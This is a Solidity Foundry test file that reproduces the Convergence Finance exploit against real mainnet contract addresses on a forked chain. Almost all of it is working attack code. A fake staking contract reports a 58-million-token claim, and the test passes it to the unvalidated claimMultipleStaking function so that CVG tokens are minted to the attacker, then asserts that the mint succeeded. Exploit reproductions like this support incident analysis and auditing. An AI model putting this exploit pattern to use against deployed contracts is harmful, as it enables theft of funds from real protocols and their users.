// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

/// @notice Vulnerable CvxRewardDistributor interface from mainnet
interface ICvxRewardDistributor {
    function claimMultipleStaking(
        address[] calldata claimContracts,
        address account,
        uint256 minCvgCvxAmountOut,
        bool isConvert,
        uint256 cvxRewardCount
    ) external;
}

/// @notice CVG token interface for balance checking
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @notice Malicious contract mimicking legitimate staking contract
contract MaliciousStaking {
    struct TokenAmount {
        address token;
        uint256 amount;
    }

    function claimCvgCvxMultiple(address)
        external
        pure
        returns (uint256 cvgClaimable, TokenAmount[] memory cvxRewards)
    {
        cvgClaimable = 58_000_000 ether; // Entire staking emission allocation
        cvxRewards = new TokenAmount[](0);
    }
}

contract ConvergenceExploitTest is Test {
    ICvxRewardDistributor constant DISTRIBUTOR = ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
    IERC20 constant CVG_TOKEN = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    address attacker;
    MaliciousStaking maliciousContract;

    function setUp() public {
        // Fork mainnet at attack block
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 20434449 ); // Attack occured in 20434450 so we roll a block before

        attacker = makeAddr("attacker");
        maliciousContract = new MaliciousStaking();

        vm.startPrank(attacker);
    }

    /// @notice Simulates the exact Convergence Finance exploit
    /// @dev Tests the input validation vulnerability in claimMultipleStaking
    function testConvergenceExploit() public {
        uint256 balanceBefore = CVG_TOKEN.balanceOf(attacker);

        // Prepare malicious contract array
        address[] memory maliciousContracts = new address[](1);
        maliciousContracts[0] = address(maliciousContract);

        // Execute exploit - no validation on contract addresses
        DISTRIBUTOR.claimMultipleStaking(
            maliciousContracts, // Malicious contract passed as legitimate staking contract
            attacker, // Mint tokens to attacker
            0, // No minimum output required
            false, // No conversion needed
            0 // No CVX rewards expected
        );

        uint256 balanceAfter = CVG_TOKEN.balanceOf(attacker);
        uint256 mintedTokens = balanceAfter - balanceBefore;

        // Verify exploit success
        assertEq(mintedTokens, 58_000_000 ether, "Should mint 58M CVG tokens");

        console.log("CVG tokens minted:", mintedTokens / 1e18);
        console.log("Exploit executed successfully");
    }

    /// @notice Demonstrates the vulnerability: no contract address validation
    function testVulnerabilityRoot() public {
        // The vulnerability: claimMultipleStaking accepts ANY address array
        // without validating if addresses are legitimate staking contracts

        address[] memory fakeContracts = new address[](2);
        fakeContracts[0] = address(maliciousContract);
        fakeContracts[1] = address(new MaliciousStaking()); // Even multiple malicious contracts work

        uint256 balanceBefore = CVG_TOKEN.balanceOf(attacker);
        DISTRIBUTOR.claimMultipleStaking(fakeContracts, attacker, 0, false, 0);
        uint256 balanceAfter = CVG_TOKEN.balanceOf(attacker);
        uint256 minted = balanceAfter - balanceBefore;
        assertEq(minted, 58718395056818121904518498);
    }
}
